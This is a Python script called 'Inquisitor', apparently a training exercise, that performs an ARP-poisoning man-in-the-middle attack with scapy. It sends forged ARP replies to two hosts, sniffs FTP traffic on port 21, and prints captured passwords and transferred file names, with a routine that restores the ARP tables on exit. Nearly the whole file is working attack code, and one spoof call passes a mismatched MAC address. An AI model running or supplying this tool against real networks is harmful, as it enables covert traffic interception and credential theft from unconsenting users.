import argparse
import os
import scapy.all as scapy
import logging
import logger

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def optparsing() -> None:
    """
    parsing shell option arguments to program
    """
    parser = argparse.ArgumentParser(prog="Inquisitor", description="ARP poisoning in the middle attack")
    parser.add_argument(
        "src_ip",
        help="IP address of source"
    )
    parser.add_argument(
        "src_mac",
        help="Mac address of source"
    )
    parser.add_argument(
        "dest_ip",
        help="IP address of destination"
    )
    parser.add_argument(
        "dest_mac",
        help="Mac address of destination"
    )
    parser.add_argument(
        "-v",
        "--verbose",
        default=False,
        action="store_true",
        help="Print out all debug"
    )
    return parser.parse_args()

def spoof(src_ip, dest_ip, dest_mac):
    ## use local mac address as source
    spoof_packet = scapy.ARP(op=2, psrc = src_ip, hwdst = dest_mac, pdst = dest_ip)
    scapy.send(spoof_packet, count=1, verbose = False)

def restore(src_ip, src_mac, dest_ip, dest_mac):
    ## use correct mac address and ip
    restore_packet = scapy.ARP(op=2, psrc = src_ip, hwsrc = src_mac, pdst = dest_ip, hwdst = dest_mac)
    scapy.send(restore_packet, count=1, verbose=False)

def process_packet(packet):
    try:
        # packet.show()
        if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load.decode('utf-8')
            if 'STOR' in payload:
                print(f'Upload Filename: {payload.split()[1]}')
            if 'RETR' in payload:
                print(f'Download Filename: {payload.split()[1]}')
            if 'PASS' in payload:
                print(f'Password: {payload.split()[1]}')
            logger.info(payload)
    except Exception as e:
        logger.error(e)

def poison(args):
    try:
        spoof(args.src_ip, args.dest_ip, args.dest_mac)
        spoof(args.dest_ip, args.src_ip, args.dest_mac)
        scapy.sniff(iface='eth0', store=False, filter='tcp port 21', prn = process_packet)
    except Exception as e:
        logger.error(e)

def esuna(args):
    restore(args.src_ip, args.src_mac, args.dest_ip, args.dest_mac)
    restore(args.dest_ip, args.dest_mac, args.src_ip, args.src_mac)

def main():
    try:
        poison(args)
    except KeyboardInterrupt:
        logger.info("..... Restoring the ARP Tables.....")
        esuna(args)
    except Exception as e:
        esuna(args)
        logger.error(e)

if __name__ == '__main__':
    args = optparsing()
    print(f"Source: {args.src_ip} and {args.src_mac}")
    print(f"Destination: {args.dest_ip} and {args.dest_mac}")
    os.environ['INQUISITOR_IS_VERBOSE'] = str(args.verbose)
    main()
